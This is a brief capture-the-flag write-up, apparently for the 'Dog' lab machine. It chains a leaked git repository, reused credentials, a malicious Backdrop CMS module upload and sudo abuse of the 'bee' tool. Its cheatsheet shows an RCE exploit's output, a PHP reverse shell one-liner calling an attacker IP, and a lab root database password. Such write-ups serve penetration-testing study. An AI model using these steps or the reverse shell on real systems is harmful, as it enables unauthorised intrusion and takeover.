# Dog \[Easy]

## Report

An exposed git repositary compromises SQL root password credentials and a user tiffany@htb for the Backdrop CMS running on port 80 allows us to login as admin on CMS. Just like Mr. Robot WordPress, manual plugins can be installed here, upload a tar.gz file which is a PHP reverse shell.

List users in home and user johncusack uses same password as root db for user flag

sudo -l shows a binary bee that can run arbitrary PHP code, use it to spawn a new bash shell

## Cheatsheet

```
python3 exploit.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php

php -r '$sock=fsockopen("10.10.14.55",9001);system("/bin/bash <&3 >&3 2>&3");'
```

## Loot

Email address - support@htb

.git  found on website, dump it

`$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'`

`grep -r "@dog.htb"`

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure></div>
